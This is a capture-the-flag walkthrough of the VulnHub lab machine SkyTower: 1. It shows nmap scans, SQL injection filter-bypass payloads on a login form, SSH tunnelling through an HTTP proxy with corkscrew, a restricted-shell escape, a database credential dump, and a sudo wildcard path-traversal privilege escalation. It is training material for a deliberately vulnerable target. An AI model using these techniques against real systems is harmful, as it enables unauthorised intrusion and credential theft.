:::::::::::::::::::::::::: page
# SkyTower: 1 {#skytower-1 .title}

\

## 

## SkyTower: 1

- **[SkyTower: 1]{style="color:#cdab8f;"}** :-

<!-- -->

- Download the machine : <https://www.vulnhub.com/entry/skytower-1,96/>

![](845-1.png)

- Now unzip the file .
- Make a machine .
- Write name SkyTower, choose type as Linux and version as other Linux
  64.
- Remove old .vdi file .
- Insert .vdi file in SATA Controller .
- Start the machine .

1.  [Network Scanning]{style="color:#986a44;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](845-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.182
:::

![](845-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.182
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.182
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.182
:::

![](845-4.png)

1.  [Web Enumeration]{style="color:#986a44;"} :

- IP visit in browser : <http://192.168.2.182>

![](845-5.png)

- We don\'t have e-mail and password, try to sql injection :

<!-- -->

- Inject the basic payload :

::: codebox
    '
:::

![](845-6.png)

![](845-7.png) Got the error .

- Using advanced SQLi payload :

::: codebox
    ' or 1=1 #
:::

![](845-8.png)

![](845-9.png) A standard payload like \' or 1=1 \# is blocked
because the application filters out keywords like OR and = .

- Bypass the filter by using logical operators instead of words :

::: codebox
    ' || 1=1#
    ' OORR 1=1#
:::

![](845-10.png)

![](845-11.png) Login Sucessfully .

- Found the credentials :

::: codebox
    Email : john@skytech.com
    Username : john
    Password : hereisjohn
:::

- Note : With no direct access to SSH the above credentials could not be
  leveraged to gain a Shell .

1.  [Pivoting to SSH]{style="color:#986a44;"} :

- SkyTower\'s SSH port is not directly accessible --- it must be
  tunneled through an HTTP proxy on port 3128 . Corkscrew handles this
  tunneling .

<!-- -->

- Install the corkscrew and proxychains tools :

::: codebox
    sudo apt install proxychains corkscrew -y
:::

- SSH Connection through the corkscrew :

::: codebox
    ssh -o ProxyCommand="corkscrew 192.168.2.182 3128 %h %p" -t john@192.168.2.182 "bash --noprofile --norc"
:::

- Corkscrew tunnels SSH through the HTTP proxy (port 3128), and \"bash
  \--noprofile \--norc\" bypasses the restricted shell on login .

![](845-12.png) Their is no sudo permission .

1.  [Privilege Escalation]{style="color:#986a44;"} :

- Read the login.php file :

::: codebox
    cat /var/www/login.php
:::

![](845-13.png)

- Found the mysql database username and password :

::: codebox
    Username : root
    Password : root
:::

- Login mysql :

::: codebox
    mysql -u root -proot
:::

- Dump all credentials :

::: codebox
    show databases;
:::

- 

::: codebox
    use SkyTech;
:::

- 

::: codebox
    show tables;
:::

- 

::: codebox
    select * from login;
:::

![](845-14.png)

- Found more e-mail and password :

  E-mail                Password
  --------------------- --------------
  john@skytech.com      hereisjohn
  sara@skytech.com      ihatethisjob
  william@skytech.com   senseable

- Now login again with sara user :

::: codebox
    ssh -o ProxyCommand="corkscrew 192.168.2.182 3128 %h %p" -t sara@192.168.2.182 "bash --noprofile --norc"
:::

![](845-15.png) Their is sudo permission .

- Sara can run cat and ls on /accounts/\* as root --- but wildcard \*
  allows path traversal .

<!-- -->

- Wildcard \* allows path traversal --- used .. to escape restricted
  directory :

::: codebox
    sudo ls /accounts/
:::

- 

::: codebox
    sudo cat /accounts/../root/flag.txt
:::

![](845-16.png) /accounts/../root/ resolves to /root/ ---
restriction bypassed .

- Found the root password :

::: codebox
    Root password : theskytower
:::

- Root Access :

::: codebox
    ssh -o ProxyCommand="corkscrew 192.168.2.182 3128 %h %p" -t root@192.168.2.182 "bash --noprofile --norc"
:::

![](845-17.png)

- [Vulnerabilities Summary]{style="color:#986a44;"} :

  No.   Vulnerability                      Impact
  ----- ---------------------------------- -----------------------------------
  1\.   SQL Injection on login form        Credential disclosure
  2\.   SSH behind HTTP proxy              Firewall bypass via corkscrew
  3\.   Restricted shell                   Bypassed via \--noprofile \--norc
  4\.   MySQL root with default password   Full DB access
  5\.   Sudo wildcard path traversal       Root privilege escalation
::::::::::::::::::::::::::
